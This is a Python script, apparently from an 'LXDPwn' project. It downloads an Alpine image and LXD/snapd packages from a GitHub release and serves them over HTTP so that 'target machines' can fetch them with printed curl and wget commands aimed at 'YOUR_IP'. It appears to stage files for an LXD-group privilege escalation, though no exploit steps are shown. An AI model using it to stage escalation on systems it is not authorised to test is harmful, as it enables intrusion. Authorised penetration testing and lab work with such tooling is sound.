#!/usr/bin/env python3
"""
LXD Offline Setup - Simple & Colorful
Just run it and enter the port when prompted
"""

import os
import sys
import time
import requests
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler

# Colors for terminal
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Configuration
DOWNLOAD_DIR = os.path.expanduser("~/lxd-offline")
DEFAULT_PORT = 8000

# CORRECTED FILES with proper repository path
FILES = [
    "alpine-v3.13-x86_64-20210218_0139.tar.gz",
    "core_17272.assert",
    "core_17272.snap",
    "lxd_37395.assert",
    "lxd_37395.snap",
    "snapd_2.71-3+b1_amd64.deb"
]

# CORRECTED BASE URL - using LXDPwn instead of LXD+helper
BASE_URL = "https://github.com/jac11/LXDPwn/releases/download/LXDPwn"

def print_banner():
    """Print colorful banner"""
    banner = f"""
{Colors.CYAN}{Colors.BOLD} _    __  ______  ______        ___   _ 
| |   \\ \\/ /  _ \\|  _ \\ \\      / / \\ | |
| |    \\  /| | | | |_) \\\\ /\\ / /|  \\| |
| |___ /  \\| |_| |  __/ \\ V  V / | |\\  |
|_____/_/\\_\\____/|_|     \\_/\\_/  |_| \\_|
               offline server
                 @jacstory
{Colors.END}
"""
    print(banner)

def print_step(step, message):
    """Print step with color"""
    steps = {
        'info': f"{Colors.BLUE}ℹ️{Colors.END}",
        'success': f"{Colors.GREEN}✅{Colors.END}",
        'warning': f"{Colors.YELLOW}⚠️{Colors.END}",
        'error': f"{Colors.RED}❌{Colors.END}",
        'download': f"{Colors.CYAN}📥{Colors.END}",
        'server': f"{Colors.CYAN}🚀{Colors.END}",
        'folder': f"{Colors.CYAN}📁{Colors.END}",
        'skip': f"{Colors.YELLOW}⏭️{Colors.END}"
    }
    icon = steps.get(step, '•')
    print(f"{icon} {message}")

def format_size(size):
    """Format file size"""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size < 1024.0:
            return f"{size:.1f} {unit}"
        size /= 1024.0
    return f"{size:.1f} TB"

def get_port():
    """Ask user for port number"""
    while True:
        try:
            print()
            port_input = input(f"{Colors.YELLOW}🔌 Enter port number [default: {DEFAULT_PORT}]: {Colors.END}").strip()
            if not port_input:
                return DEFAULT_PORT
            port = int(port_input)
            if 1 <= port <= 65535:
                return port
            else:
                print_step('error', "Port must be between 1 and 65535")
        except ValueError:
            print_step('error', "Please enter a valid number")

def download_file(url, filename):
    """Download file with progress bar"""
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        
        total_size = int(response.headers.get('content-length', 0))
        downloaded = 0
        start_time = time.time()
        
        with open(filename + '.tmp', 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                    downloaded += len(chunk)
                    
                    if total_size > 0:
                        percent = (downloaded / total_size) * 100
                        bar_length = 30
                        filled = int(bar_length * downloaded // total_size)
                        bar = f"{Colors.GREEN}█{Colors.END}" * filled + f"{Colors.WHITE}░{Colors.END}" * (bar_length - filled)
                        
                        elapsed = time.time() - start_time
                        speed = downloaded / elapsed if elapsed > 0 else 0
                        
                        sys.stdout.write(f'\r  {bar} {percent:.1f}% | {format_size(downloaded)}/{format_size(total_size)} | {format_size(speed)}/s')
                        sys.stdout.flush()
        
        os.rename(filename + '.tmp', filename)
        print()  # New line after progress
        print_step('success', f"{filename} downloaded successfully")
        return True
        
    except Exception as e:
        print()  # New line after progress
        print_step('error', f"Failed to download {filename}: {e}")
        return False

def main():
    print_banner()
    
    # Create directory
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
    os.chdir(DOWNLOAD_DIR)
    print_step('folder', f"Working directory: {Colors.BOLD}{DOWNLOAD_DIR}{Colors.END}")
    
    # Download files
    print_step('info', "Checking files...")
    print()
    
    for filename in FILES:
        filepath = os.path.join(DOWNLOAD_DIR, filename)
        if os.path.exists(filepath):
            size = os.path.getsize(filepath)
            print_step('skip', f"{filename} ({Colors.BOLD}{format_size(size)}{Colors.END})")
        else:
            url = f"{BASE_URL}/{filename}"
            print_step('download', f"Downloading {Colors.BOLD}{filename}{Colors.END}...")
            download_file(url, filename)
    
    # Show all files with details
    print()
    print_step('info', f"{Colors.BOLD}Files in repository:{Colors.END}")
    print(f"{Colors.CYAN}╔{'═' * 70}╗{Colors.END}")
    
    files_list = []
    total_size = 0
    for filename in sorted(os.listdir('.')):
        if os.path.isfile(filename):
            size = os.path.getsize(filename)
            total_size += size
            modified = datetime.fromtimestamp(os.path.getmtime(filename))
            files_list.append((filename, size, modified))
    
    for filename, size, modified in files_list:
        size_str = format_size(size)
        mod_str = modified.strftime("%Y-%m-%d %H:%M")
        print(f"{Colors.CYAN}║{Colors.END}  • {Colors.WHITE}{filename:<40}{Colors.END} {Colors.GREEN}{size_str:>8}{Colors.END}  {Colors.YELLOW}{mod_str}{Colors.END}  {Colors.CYAN}║{Colors.END}")
    
    print(f"{Colors.CYAN}╚{'═' * 70}╝{Colors.END}")
    print_step('info', f"Total: {Colors.BOLD}{len(files_list)} files ({format_size(total_size)}){Colors.END}")
    
    # Get port from user
    port = get_port()
    
    # Start server
    print()
    print_step('server', f"{Colors.BOLD}Starting HTTP server on port {port}...{Colors.END}")
    print_step('folder', f"Serving files from: {Colors.BOLD}{DOWNLOAD_DIR}{Colors.END}")
    print()
    print(f"{Colors.GREEN}💡 On target machines, use:{Colors.END}")
    print(f"   {Colors.YELLOW}curl -O http://YOUR_IP:{port}/<filename>{Colors.END}")
    print(f"   {Colors.YELLOW}wget http://YOUR_IP:{port}/<filename>{Colors.END}")
    print()
    print(f"{Colors.CYAN}📋 Available files:{Colors.END}")
    for filename, size, _ in files_list:
        print(f"   • {Colors.WHITE}{filename}{Colors.END} ({Colors.GREEN}{format_size(size)}{Colors.END})")
    print()
    print(f"{Colors.YELLOW}⏸️  Press Ctrl+C to stop the server{Colors.END}")
    print()
    
    # Start HTTP server
    os.chdir(DOWNLOAD_DIR)
    
    class ColorHandler(SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            if args[1] == 200:
                filename = args[0].split()[1][1:]
                print(f"{Colors.GREEN}📤 {Colors.END}{Colors.WHITE}{filename}{Colors.END} {Colors.CYAN}served{Colors.END}")
    
    httpd = HTTPServer(("0.0.0.0", port), ColorHandler)
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print()
        print()
        print_step('info', f"{Colors.BOLD}Server stopped{Colors.END}")
        httpd.shutdown()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        print_step('info', f"{Colors.BOLD}Setup cancelled{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print_step('error', f"Unexpected error: {e}")
        sys.exit(1)